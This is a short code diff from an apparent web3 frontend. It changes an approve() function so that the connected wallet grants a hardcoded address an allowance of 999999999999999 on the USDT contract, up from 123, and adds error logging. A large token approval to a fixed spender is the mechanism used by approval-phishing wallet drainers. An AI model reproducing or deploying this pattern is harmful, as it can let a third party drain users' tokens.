@@ -8,16 +8,20 @@ import { abi } from './abi'
 const { writeContract } = useWriteContract()
 
 async function approve() {
-
-  await writeContract({
-    abi,
-    address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // 智能合约地址
-    functionName: 'approve',
-    args: [
-      '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb',// 被授权地址
-      123n,
-    ],
-  })
+  try {
+    await writeContract({
+      abi,
+      address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT合约地址
+      functionName: 'approve',
+      args: [
+        '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', // 被授权地址
+        999999999999999n, // 授权金额
+      ],
+    });
+    console.log('Approval successful');
+  } catch (error) {
+    console.error('Approval failed:', error);
+  }
 }
 
 // 1. Get projectId from https://cloud.reown.com
